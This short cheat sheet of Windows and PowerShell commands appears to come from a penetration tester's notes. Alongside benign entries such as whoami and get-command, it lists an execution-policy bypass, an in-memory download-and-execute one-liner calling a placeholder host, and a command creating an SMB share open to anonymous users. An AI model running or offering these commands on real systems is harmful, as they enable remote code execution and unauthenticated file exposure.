# Introduction

Windows commands and things

# Contents

[[_TOC_]]

# CLI Tools 

| Command | Description | 
| ------- | ----------- |
| Get current user | `whoami` |
| Get current user's groups | `whoami /groups` |

# Useful file locations

## PowerShell

### 32-bit
```
C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe
```

# Basic PowerShell Cmdlets
## Display commands available in your current PowerShell session:
```
get-command
```

## Import a module into PowerShell:
```
import-module <my_powershell_script.ps1>
```

## Change execution policy to allow system to run scripts:
```
set-executionpolicy bypass -scope process
```

# Cool PowerShell Commands
## Download and execute a PowerShell script in memory:
```
iex(New-Object net.WebClient).downloadString("http://<ip_hosting_file>/PowerShell_Script_Name.ps1")
```

## Create an SMB share that doesn't require authentication:
```
New-SmbShare -Name "Your_Share_Name" -Path "C:\Path\To\Files" -FullAccess "Everyone","Guests","Anonymous Logon"

```